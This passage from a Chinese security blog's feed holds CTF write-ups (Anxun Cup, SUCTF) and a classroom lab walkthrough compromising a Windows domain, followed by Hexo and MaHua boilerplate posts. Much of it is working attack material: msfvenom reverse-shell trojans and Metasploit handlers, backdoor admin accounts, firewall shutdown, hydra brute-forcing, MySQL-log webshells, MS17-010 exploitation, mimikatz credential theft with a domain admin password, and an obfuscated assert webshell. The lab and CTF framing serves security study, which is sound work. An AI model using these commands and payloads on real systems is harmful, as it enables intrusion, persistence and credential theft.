class="line">session_start();</div><div class="line">class Anti</div><div class="line">&#123;</div><div class="line">    public $info;</div><div class="line">    function __construct()</div><div class="line">    &#123;</div><div class="line">        $this-&gt;info = &apos;phpinfo();&apos;;</div><div class="line">    &#125;</div><div class="line">    function __destruct()</div><div class="line">    &#123;</div><div class="line">        eval($this-&gt;info);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">if(isset($_GET[&apos;aa&apos;]))</div><div class="line">&#123;</div><div class="line">    if(unserialize($_GET[&apos;aa&apos;])==&apos;phpinfo&apos;)</div><div class="line">    &#123;</div><div class="line">    $m = new Anti();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">else</div><div class="line">&#123;</div><div class="line">    header(&quot;location:index.html&quot;);</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:&#123;s:4:&quot;info&quot;;s:10:&quot;phpinfo();&quot;;&#125;</div></pre></td></tr></table></figure><p>通过phpinfo页面，我们知道php.ini中默认session.serialize_handler为php_serialize，而index.php中将其设置为php。这就导致了seesion的反序列化问题。<br><img src="http://img.cdn.cuittk.cn/ownfuv1g1egsy7fe1yi2nkoi52.png" alt=""><br>由phpinfo()页面继续可知，session.upload_progress.enabled为On。<br><img src="http://img.cdn.cuittk.cn/1774cramyqzolwreros5q3e1xl.png" alt=""><br>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。<br>传入$_SESSION数据的，这里就利用到了反序列化问题。<br>考虑序列化<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">class Anti</div><div class="line">&#123;</div><div class="line">    public $info=&apos;print_r(scandir(dirname(__FILE__)));&apos;;</div><div class="line">&#125;</div><div class="line">$obj = new Anti();</div><div class="line">$a = serialize($obj);</div><div class="line">var_dump($a);</div><div class="line">?&gt;</div><div class="line">//O:4:&quot;Anti&quot;:1:&#123;s:4:&quot;info&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;&#125;</div></pre></td></tr></table></figure></p><p><a href="http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}" target="_blank" rel="external">http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</a><br>发现flag文件<a href="http://54.200.169.99:7000/f1ag_i3_h3re" target="_blank" rel="external">http://54.200.169.99:7000/f1ag_i3_h3re</a><br>D0g3{Sim_Pl3_S3sSi0n}</p><h4 id="Hash"><a href="#Hash" class="headerlink" title="Hash!!!"></a>Hash!!!</h4><p>修改响应头<img src="http://img.cdn.cuittk.cn/xbclo5hrrhk6ghemlqbp4dkcpu.png" alt=""><br>Source改为1拿到源码<br><img src="http://img.cdn.cuittk.cn/ur395jrl3qujiy7g69fhn54elj.png" alt=""><br>要么cbc要么hash扩展  用hashpump<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Input Signature: c3ef608fdc59d9143c39664ade7556d5</div><div class="line">Input Data: D0g3</div><div class="line">Input Key Length: 20</div><div class="line">Input Data to Add: test</div><div class="line">5e38fe415ce2786f4ae79776038f53ee</div><div class="line">D0g3\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00test</div></pre></td></tr></table></figure></p><p>将\x改为%，将POST的username改为D0g3，password改为<code>D0g3%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c0%00%00%00%00%00%00%00test</code><br>cookie加入getflag: 5e38fe415ce2786f4ae79776038f53ee<br>拿到flag：D0g3{h4sh_1s_s0_diffic1ut_t0_me}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;第一届安洵杯writeup&quot;&gt;&lt;a href=&quot;#第一届安洵杯writeup&quot; class=&quot;headerlink&quot; title=&quot;第一届安洵杯writeup&quot;&gt;&lt;/a&gt;第一届安洵杯writeup&lt;/h2&gt;&lt;p&gt;线上赛混个第三名，跟着大佬们，躺进下线赛了。&lt;/p&gt;
      
    
    </summary>
    
      <category term="web安全" scheme="http://www.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>域环境综合渗透过程</title>
    <link href="http://www.cuittk.cn/2018/11/15/%E5%9F%9F%E7%8E%AF%E5%A2%83%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/"/>
    <id>http://www.cuittk.cn/2018/11/15/域环境综合渗透过程/</id>
    <published>2018-11-15T06:42:08.868Z</published>
    <updated>2018-11-16T10:24:50.707Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://img.cdn.cuittk.cn/vmo6tbrh5093h6k9sd4yefknh4.png" alt=""><br>通过普通域用户的机器的控制权，在防火墙的限制下，一步一步渗透整个域环境。<br>班级老师布置的一次实验，我记录了一下这次实验的过程然后分享出来，供小白参考，望大牛忽喷。</p><h3 id="域环境简介"><a href="#域环境简介" class="headerlink" title="域环境简介"></a>域环境简介</h3><p>A组：<br>1号机（域成员）：用户名 win_10_1 &#160;&#160;&#160;主机名 win_10_1 &#160;&#160;&#160;&#160;ip地址:192.168.135.1<br>2号机（域成员）：用户名 win_7_2 &#160;&#160;&#160;&#160;&#160;主机名 win_7_2 &#160;&#160;&#160;&#160;&#160;&#160;ip地址:192.168.135.2<br>3号机（ 域控 ）&#160;：用户名 win_2012_3     主机名 win_2012_3  ip地址:192.168.135.3<br>4号机（域成员）：用户名 win_2003_4     主机名 win_2003_4  ip地址:192.168.135.4<br>5号机（域成员）：用户名 win_2008_5     主机名 win_2008_5  ip地址:192.168.135.5<br>6号机（域成员）：用户名 win_2008_6     主机名 win_2008_6  ip地址:192.168.135.6<br>B组：<br>Kali攻击机 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ip地址：192.168.135.106<br>Windows10 攻击机 ip地址：192.168.135.102<br>其实攻击机都应该使用公网ip，本次渗透就简单采用私有ip。<br>可以只用kail的，为了方便多用个windows 10攻击机。</p><h3 id="渗透开始"><a href="#渗透开始" class="headerlink" title="渗透开始"></a>渗透开始</h3><h4 id="利用msf生成攻击木马-，2号机运行，获取2号机权限"><a href="#利用msf生成攻击木马-，2号机运行，获取2号机权限" class="headerlink" title="利用msf生成攻击木马 ，2号机运行，获取2号机权限"></a>利用msf生成攻击木马 ，2号机运行，获取2号机权限</h4><p>攻击机kali 通过msfvenom生成test.exe<br>生成木马：<br><code>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=192.168.135.106 LPORT=1234 -f exe &gt; ./test.exe</code><br>实际LHOST应该为公网ip<br>木马传入2号机<br>打开Metaspoit。监听1234端口，进行攻击。<br><code>sudo msfconsole</code><br><code>use exploit/multi/handler</code><br><code>set PAYLOAD windows/meterpreter/reverse_tcp</code><br><code>set LHOST 192.168.135.106</code><br><code>set LPORT 1234</code><br><code>exploit</code><br>2号机上运行test.exe获取到shell<br><img src="http://img.cdn.cuittk.cn/070r232qxvtpgxcw57uyp7sexw.png" alt=""><br>上传端口转发工具htran.exe并转发出3389端口<br>meterpreter&gt;<code>upload /root/Desktop/htran.exe C:\\Users\\win_7_2\\Desktop\\htran.exe</code><br>meterpreter&gt;shell<br>创建用户并加入管理员组<br><code>net user hacker Qwer123456 /add</code><br><code>net localgroup administrators hacker /add</code><br>开启2号机的3389命令<br><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code><br>关闭防火墙<br><code>netsh adcfirewall set allprofiles state off</code><br>运行端口转发程序，转发到windows10攻击机上：<br><code>htran.exe -p -slave 192.168.135.102 2048 192.168.135.2 3389</code><br>实际转发出的ip应该为公网ip<br>windows10攻击机本地端口监听<br><code>./htran.exe -p -listen 2048 10000</code><br>windows10攻击机本地连接10000端口，得到2号机的3389<br><img src="http://img.cdn.cuittk.cn/agofsr2jai8s38gnw29x7ncihe.png" alt=""></p><h4 id="攻击6号机（win2008）6号只对2号开放1433端口，sa账号为弱口令"><a href="#攻击6号机（win2008）6号只对2号开放1433端口，sa账号为弱口令" class="headerlink" title="攻击6号机（win2008）6号只对2号开放1433端口，sa账号为弱口令"></a>攻击6号机（win2008）6号只对2号开放1433端口，sa账号为弱口令</h4><p>连接上反弹回来的2号机的3389端口，上传hydra.exe爆破工具。<br>通过工具爆破sa的密码，然后sqlserver提权拿到6号机。<br>hydra.exe -l sa -P d:\pass.txt 192.168.135.6 mssql<br><img src="http://img.cdn.cuittk.cn/skuabas37a3pid904sm0ziqbk2.png" alt=""><br>爆破得到密码为Www123456<br>使用sqltools工具连接192.168.135.6<br>创建用户并加入管理员组<br><img src="http://img.cdn.cuittk.cn/ilg1d8oh6cu9pagbqpmso6ed34.png" alt=""><br>开启6号机的3389端口命令<br><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code><br>关闭防火墙<br><code>netsh adcfirewall set allprofiles state off</code><br>上传端口转发工具htran.exe让6号机转出3389端口<br><code>htran.exe -p -slave 192.168.135.102 2049 192.168.135.6 3389</code><br>windows10攻击机本地端口监听<br><code>./htran.exe -p -listen 2049 10001</code><br>windows10攻击机本地连接10001端口，得到6号机的3389<br><img src="http://img.cdn.cuittk.cn/lk91aetlad5tg7g6qs8v6vrqz1.png" alt=""></p><h4 id="攻击5号机（win2008）只对6号开放80端口，默认安装phpstudy套件，mysql弱口令。"><a href="#攻击5号机（win2008）只对6号开放80端口，默认安装phpstudy套件，mysql弱口令。" class="headerlink" title="攻击5号机（win2008）只对6号开放80端口，默认安装phpstudy套件，mysql弱口令。"></a>攻击5号机（win2008）只对6号开放80端口，默认安装phpstudy套件，mysql弱口令。</h4><p>连接上反弹回来的6号机的3389端口。<br>在6号机上访问5号机<br><img src="http://img.cdn.cuittk.cn/0g3ggostpgugzq56iv8kpmgarw.png" alt=""><br>phpmyadmin后台登陆密码弱口令，root,root。在网站的探针中处找到phpstudy的绝对路径为C:/Program Files/WWW/<br>使用常用的修改查询日志的方法getshell<br><code>show variables like &#39;%general%&#39;;</code><br><code>set global general_log = on;</code><br><code>set global general_log_file = &#39;C:/Program Files/WWW/shell.php&#39;;</code><br><code>select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;</code><br>失败</p><p>mysql日志主要包含:错误日志、查询日志、慢查询日志、事务日志等。<br>要突破secure_file_priv写shell<br>主要利用慢查询日志来写shell<br>设置slow_query_log=1.即启用慢查询日志(默认禁用)。<br>set global slow_query_log=1;<br>伪造(修改)slow_query_log_file日志文件的绝对路径以及文件名<br>set global slow_query_log_file=’C:/Program Files/WWW/shell.php’;<br>select ‘&lt;?php eval($_POST[cmd]);?&gt;’ or sleep(11);        #必须要有or sleep(11)<br>因为是用的慢查询日志，所以说只有当查询语句执行的时间要超过系统默认的时间（默认10秒）时,该语句才会被记入进慢查询日志。<br>6号机上安装菜刀，使用菜刀连接<br><img src="http://img.cdn.cuittk.cn/liiqkqnalfecd475ejxlhxk2tv.png" alt=""><br>新建用户并加入管理员组，开5号机3389端口，关闭防火墙，5号机转出3389，代码同上。</p><h4 id="攻击4号机（win2003）只对5号机开放445端口，留ms17010漏洞"><a href="#攻击4号机（win2003）只对5号机开放445端口，留ms17010漏洞" class="headerlink" title="攻击4号机（win2003）只对5号机开放445端口，留ms17010漏洞"></a>攻击4号机（win2003）只对5号机开放445端口，留ms17010漏洞</h4><p>连接上反弹回来的5号机的3389端口，登陆5号机。<br>使用ms17010攻击4号机。<br>5号机上传test.exe木马，kali中监听1234端口<br><code>sudo msfconsole</code><br><code>use exploit/multi/handler</code><br><code>set PAYLOAD windows/meterpreter/reverse_tcp</code><br><code>set LHOST 192.168.135.106</code><br><code>set LPORT 1234</code><br><code>exploit</code><br>5号机运行test.exe木马kali中获取5号机器的shell</p><p>先设置路由<br>meterpreter&gt; run get_local_subnets                    （获取当前路由）<br>meterpreter&gt; run autoroute -s 192.168.135.0/24    （添加路由）<br>meterpreter&gt; run autoroute -p                         （查看已添加路由）<br>meterpreter&gt;background                                （退到后台）<br>攻击正式开始<br>第一步：use exploit/windows/smb/ms17_010_psexec（切换到攻击模块）<br>第二步：set rhost 192.168.135.4（设置存在445漏洞的PC电脑IP）<br>第三步：set lport 4444            （设置反弹监听端口）<br>第四步：新开一个msf监听4444端口<br>use exploit/multi/handler<br>set PAYLOAD windows/meterpreter/reverse_tcp<br>set LHOST 192.168.135.106<br>set LPORT 4444<br>exploit<br>第五步：exploit（执行攻击）<br>第六步：攻击完成，新开的msf返回一个shell控制台（如下图）<br><img src="http://img.cdn.cuittk.cn/oz0y2yma8xgviav8izpwgn08du.png" alt=""><br>shell命令后在4号机上创建用户，开启3389端口，关闭防火墙，代码同上。</p><h4 id="攻击3号机（win2012）只对4号开放445端口，3号用3389登入4号，域管账户登录，然后断开。"><a href="#攻击3号机（win2012）只对4号开放445端口，3号用3389登入4号，域管账户登录，然后断开。" class="headerlink" title="攻击3号机（win2012）只对4号开放445端口，3号用3389登入4号，域管账户登录，然后断开。"></a>攻击3号机（win2012）只对4号开放445端口，3号用3389登入4号，域管账户登录，然后断开。</h4><p>使用msf17010打3号机域控。<br>拿到4号的3389后，因为3号用域控账号通过3389登陆过4号，因此上传mimikatz到4号机，抓取域控密码<br><img src="http://img.cdn.cuittk.cn/qkadegarjagzxzqhazo4pnf6la.png" alt=""><br>域控用户为Administrator，域为QWEROK，密码为Qwer#w12#03<br>4号机上传test.exe木马，kali中监听1234端口，使用msf17010攻击3号机<br>获取shell后：添加路由规则<br>meterpreter&gt; run autoroute -s 192.168.135.0/24<br>meterpreter&gt;background                                （退到后台）<br>攻击正式开始<br>第一步：use exploit/windows/smb/ms17_010_psexec（切换到攻击模块）<br>第二步：set rhost 192.168.135.3（攻击域控对4号机开放的445端口）<br>第三步：set lport 4445            （设置反弹监听端口）<br>第四步：新开一个msf监听4445端口<br>use exploit/multi/handler<br>set PAYLOAD windows/meterpreter/reverse_tcp<br>set LHOST 192.168.135.106<br>set LPORT 4445<br>exploit<br>第五步：exploit（执行攻击）<br>第六步：攻击完成，新开的msf返回一个shell控制台（如下图）<br>反弹出3号机的3389端口。使用administrator登陆域控。<br><img src="http://img.cdn.cuittk.cn/lhu1zjdtif869u3fnayh10g22o.png" alt=""></p><h4 id="攻击1号机（win10）只对3号开放445端口"><a href="#攻击1号机（win10）只对3号开放445端口" class="headerlink" title="攻击1号机（win10）只对3号开放445端口"></a>攻击1号机（win10）只对3号开放445端口</h4><p>利用域控的用户名和密码，使用ms17010攻击1号机。<br>获得到3号机的3389，直接连接上传test.exe木马<br>获取shell后：添加路由规则<br>meterpreter&gt; run autoroute -s 192.168.135.0/24<br>use exploit/windows/smb/ms17_010_psexec<br>set lhost 192.168.135.106<br>set RHOST 192.168.135.1<br>set SMBUser Administrator<br>set SMBPass Qwer#w12#03<br>set SMBDomain qwerok.com<br>set lport 4446<br>同样新开一个msf监听4446端口<br>use exploit/multi/handler<br>set PAYLOAD windows/meterpreter/reverse_tcp<br>set LHOST 192.168.135.106<br>set LPORT 4446<br>exploit<br>exploit（执行攻击）<br>收到回弹，攻击成功，拿到1号机。<br><img src="http://img.cdn.cuittk.cn/32bsfy7hjasdzydq1b4e2v2hux.png" alt=""><br>创建用户并加入管理员组，开启3389端口，关闭防火墙，代码同上。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>有重复造轮子的嫌疑，但是有些文章也没写具体，实际中遇到很多坑。算是给自己写个详细过程，哪天忘记了回来看看。</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/c1e4r/articles/8902444.html" target="_blank" rel="external">https://www.cnblogs.com/c1e4r/articles/8902444.html</a><br><a href="https://bbs.ichunqiu.com/article-1500-1.html" target="_blank" rel="external">https://bbs.ichunqiu.com/article-1500-1.html</a><br><a href="https://www.fengiling.com/blog/view/?id=702183" target="_blank" rel="external">https://www.fengiling.com/blog/view/?id=702183</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;http://img.cdn.cuittk.cn/vmo6tbrh5093h6k9sd4yefknh4.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;通过普通域用户的机器的控制权，在防火墙的限制下，一步一步渗透整个域环境。&lt;br&gt;班级老师布置的一次实验，我记录了一下这
      
    
    </summary>
    
      <category term="web安全" scheme="http://www.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>SUCTF 2018 writeup</title>
    <link href="http://www.cuittk.cn/2018/11/10/SUCTF%202018%20writeup/"/>
    <id>http://www.cuittk.cn/2018/11/10/SUCTF 2018 writeup/</id>
    <published>2018-11-10T09:12:34.809Z</published>
    <updated>2019-11-11T17:11:48.992Z</updated>
    
    <content type="html"><![CDATA[<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="Anonymous"><a href="#Anonymous" class="headerlink" title="Anonymous"></a>Anonymous</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$MY = create_function(&quot;&quot;,&quot;die(`cat flag.php`);&quot;);</div><div class="line">$hash = bin2hex(openssl_random_pseudo_bytes(32));</div><div class="line">eval(&quot;function SUCTF_$hash()&#123;&quot;</div><div class="line">    .&quot;global \$MY;&quot;</div><div class="line">    .&quot;\$MY();&quot;</div><div class="line">    .&quot;&#125;&quot;);</div><div class="line">if(isset($_GET[&apos;func_name&apos;]))&#123;</div><div class="line">    $_GET[&quot;func_name&quot;]();</div><div class="line">    die();</div><div class="line">&#125;</div><div class="line">show_source(__FILE__);</div></pre></td></tr></table></figure><p>参考：<a href="https://www.jianshu.com/p/19e3ee990cb7" target="_blank" rel="external">https://www.jianshu.com/p/19e3ee990cb7</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">import socket</div><div class="line">import time</div><div class="line">from multiprocessing.dummy import Pool as ThreadPool</div><div class="line">try:</div><div class="line">    requests.packages.urllib3.disable_warnings()</div><div class="line">except:</div><div class="line">    pass</div><div class="line"></div><div class="line">def run(i):</div><div class="line">    while 1:</div><div class="line">        HOST = &apos;web.suctf.asuri.org&apos;</div><div class="line">        PORT = 81</div><div class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">        s.connect((HOST, PORT))</div><div class="line">        s.sendall(&apos;GET /index.php HTTP/1.1\nHost: web.suctf.asuri.org\nConnection: Keep-Alive\n\n&apos;)</div><div class="line">        # s.close()</div><div class="line">        print &apos;ok&apos;</div><div class="line">        time.sleep(0.5)</div><div class="line">        print requests.get(&apos;http://web.suctf.asuri.org:81/index.php?func_name=%00lambda_1&apos;).content</div><div class="line"></div><div class="line">i = 8</div><div class="line">pool = ThreadPool( i )</div><div class="line">result = pool.map_async( run, range(i) ).get(0xffff)</div></pre></td></tr></table></figure></p><p><img src="http://img.cdn.cuittk.cn/bz2ipyu22owdn1mgwsiadr6bt9.png" alt=""></p><h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>要求上传的webshell文件从第6个字符开始都不能在黑名单内。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">if($contents=file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]))&#123;</div><div class="line">    $data=substr($contents,5);</div><div class="line">    foreach ($black_char as $b) &#123;</div><div class="line">        if (stripos($data, $b) !== false)&#123;</div><div class="line">            die(&quot;illegal char&quot;);</div><div class="line">        &#125;</div><div class="line">    &#125;     </div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>用burp intruder跑一遍，发现不在黑名单里的可打印字符有 $()[]_~=;. 共10个。</p><p>跑的时候需注意Intruder=&gt;payloads=&gt;payload encoding 处需取消勾选，否则会因为字符编码而不能得到正确的白名单。</p><p>跑的时候可以在Intruder=&gt;options=&gt;Grep-Match 中选择 flag illegal ，这样就可以快速看到那些字符是合法的了。</p><p>接下来就是构造一个由 $()[]_~=;. 组成的webshell了，主要思路来自 一些不包含数字和字母的webshell 。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$_=_==_;//1 _==_ 它两相等为True 那么$_就被赋值为1了</div></pre></td></tr></table></figure></p><p>“~” 求反运算<br><img src="http://img.cdn.cuittk.cn/c19y2cbh91nstj0g883h7ntrzf.png" alt=""><br>所以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&lt;?= </div><div class="line">$_=_==_;//1 _==_ 相等为True 那么$_就被赋值为1了</div><div class="line">$__=~一[$_];//G</div><div class="line">$___=~二[$_];//E</div><div class="line">$____=~端[$_];//T</div><div class="line">$_____=~得[$_];//A</div><div class="line">$______=~第[$_];//S</div><div class="line">$_______=~学[$_];//R</div><div class="line">$_=_.$__.$___.$____;//_GET</div><div class="line">$_=$$_;//$_GET</div><div class="line">$__=$_____.$______.$______.$___.$_______.$____;//ASSERT</div><div class="line">$__($_[_]);//ASSERT($_GET[_]);</div><div class="line"></div><div class="line">echo ~对[$_];//P</div><div class="line">echo ~就[$_];//O</div><div class="line">echo ~第[$_];//S</div><div class="line">echo ~端[$_];//T</div><div class="line">------------------------------------------------------</div><div class="line">http://web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php</div><div class="line">?_=phpinfo();</div></pre></td></tr></table></figure></p><p>构造出的最终结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?= $_=_==_;</div><div class="line">$__=~对[$_];</div><div class="line">$___=~就[$_];</div><div class="line">$____=~第[$_];</div><div class="line">$_____=~端[$_];</div><div class="line">$______=~得[$_];</div><div class="line">$_______=~二[$_];</div><div class="line">$________=~学[$_];</div><div class="line">$_=_.$__.$___.$____.$_____;</div><div class="line">$_=$$_;</div><div class="line">$__=$______.$____.$____.$_______.$________.$_____;</div><div class="line">$__($_[_]);</div><div class="line"></div><div class="line"></div><div class="line">//ASSERT($_POST[_]);可用菜刀连接</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h3&gt;&lt;h4 id=&quot;Anonymous&quot;&gt;&lt;a href=&quot;#Anonymous&quot; class=&quot;headerlink&quot; title=&quot;Ano
      
    
    </summary>
    
      <category term="web安全" scheme="http://www.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>mahua</title>
    <link href="http://www.cuittk.cn/2018/11/10/mahua/"/>
    <id>http://www.cuittk.cn/2018/11/10/mahua/</id>
    <published>2018-11-10T09:12:34.377Z</published>
    <updated>2018-11-10T09:12:34.378Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://img.cdn.cuittk.cn/mahua-logo.jpg" alt="mahua"></p><h2 id="MaHua是什么"><a href="#MaHua是什么" class="headerlink" title="MaHua是什么?"></a>MaHua是什么?</h2><p>一个在线编辑markdown文档的编辑器</p><p>向Mac下优秀的markdown编辑器mou致敬</p><h2 id="MaHua有哪些功能？"><a href="#MaHua有哪些功能？" class="headerlink" title="MaHua有哪些功能？"></a>MaHua有哪些功能？</h2><ul><li>方便的<code>导入导出</code>功能<ul><li>直接把一个markdown的文本文件拖放到当前这个页面就可以了</li><li>导出为一个html格式的文件，样式一点也不会丢失</li></ul></li><li>编辑和预览<code>同步滚动</code>，所见即所得（右上角设置）</li><li><code>VIM快捷键</code>支持，方便vim党们快速的操作 （右上角设置）</li><li>强大的<code>自定义CSS</code>功能，方便定制自己的展示</li><li>有数量也有质量的<code>主题</code>,编辑器和预览区域</li><li>完美兼容<code>Github</code>的markdown语法</li><li>预览区域<code>代码高亮</code></li><li>所有选项自动记忆</li></ul><h2 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h2><p><a href="http://mahua.jser.me" target="_blank" rel="external">mahua</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;http://img.cdn.cuittk.cn/mahua-logo.jpg&quot; alt=&quot;mahua&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;MaHua是什么&quot;&gt;&lt;a href=&quot;#MaHua是什么&quot; class=&quot;headerlink&quot; title=&quot;MaHua
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://www.cuittk.cn/2018/11/10/hello-world/"/>
    <id>http://www.cuittk.cn/2018/11/10/hello-world/</id>
    <published>2018-11-10T09:12:34.231Z</published>
    <updated>2018-11-10T09:12:34.232Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
  </entry>
  
  <entry>
